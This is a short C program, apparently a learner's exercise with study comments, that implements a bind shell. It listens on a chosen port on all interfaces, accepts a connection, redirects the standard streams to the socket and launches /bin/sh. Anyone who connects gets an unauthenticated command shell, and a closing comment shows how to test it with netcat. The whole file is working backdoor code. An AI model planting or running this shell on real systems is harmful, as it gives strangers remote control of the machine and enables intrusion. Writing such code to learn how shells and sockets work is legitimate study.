#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main(int argc,char *argv[]) {

    //just checking if there is a port argument
    if( argc < 2) {
        fprintf(stderr,"ERROR,no port provided\n");
        printf("usage: ./file <port>");
        exit(1);
    }

    //creating vars to sockets,port and size
    int sockfd,another_sockfd,port;
    size_t sz;

    //cast arg to number
    port = atoi(argv[1]);

    //we need to create this struct from netinet/in.h
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    //convert to network byte order
    server_addr.sin_port = htons(port);
    //binds to all interfaces
    server_addr.sin_addr.s_addr = INADDR_ANY;
    sz = sizeof(server_addr);
   
    sockfd = socket(AF_INET,SOCK_STREAM,0);

    if(sockfd == -1) {
        printf("An error occoured...\n");
        return -1;
        }

    //maybe use errno or set a function error after
    if( (bind(sockfd,(struct sockaddr *) &server_addr,sz)) != 0 ) {
        printf("An error occourred...\n");
        return -1;
    }
    
    listen(sockfd,0);
    
    //didn't understand this yet
    another_sockfd = accept(sockfd,NULL,NULL);

    dup2(another_sockfd,0);
    dup2(another_sockfd,1);
    dup2(another_sockfd,2);
    
    execve("/bin/sh",NULL,NULL);
    

    // ./binary <port>
    // in other terminal: nc 127.0.0.1 <port>
    return 0;

}
